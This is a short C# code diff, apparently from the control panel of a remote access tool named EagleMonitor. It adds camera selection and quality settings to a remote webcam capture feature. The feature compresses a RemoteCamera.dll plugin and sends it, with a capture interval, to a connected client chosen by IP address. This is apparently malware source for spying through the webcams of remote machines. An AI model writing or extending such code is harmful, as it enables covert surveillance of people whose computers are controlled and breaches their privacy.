@@ -60,15 +60,20 @@ namespace EagleMonitor.Forms
         {
             if (captureGuna2ToggleSwitch.Checked)
             {
-                RemoteCameraCapturePacket remoteCameraCapturePacket = new RemoteCameraCapturePacket(PacketType.RC_CAPTURE_ON);
+                if (camerasGuna2ComboBox.Items.Count > 0)
+                {
+                    RemoteCameraCapturePacket remoteCameraCapturePacket = new RemoteCameraCapturePacket(PacketType.RC_CAPTURE_ON);
 
-                remoteCameraCapturePacket.plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\RemoteCamera.dll"), 1);
-                int.TryParse(intervalGuna2TextBox.Text, out int interval);
-                remoteCameraCapturePacket.timeMS = interval;
-                this.loadingCircle1.Visible = true;
-                this.loadingCircle1.Active = true;
+                    remoteCameraCapturePacket.plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\RemoteCamera.dll"), 1);
+                    int.TryParse(intervalGuna2TextBox.Text, out int interval);
+                    remoteCameraCapturePacket.timeMS = interval;
+                    remoteCameraCapturePacket.index = camerasGuna2ComboBox.SelectedIndex;
+                    remoteCameraCapturePacket.quality = qualityGuna2TrackBar.Value;
+                    this.loadingCircle1.Visible = true;
+                    this.loadingCircle1.Active = true;
 
-                ClientHandler.ClientHandlersList[baseIp].SendPacket(remoteCameraCapturePacket);
+                    ClientHandler.ClientHandlersList[baseIp].SendPacket(remoteCameraCapturePacket);
+                }
             }
             else
             {
